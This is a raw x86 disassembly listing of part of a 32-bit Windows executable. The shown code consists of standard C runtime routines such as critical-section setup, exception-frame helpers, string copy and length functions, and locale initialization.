  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
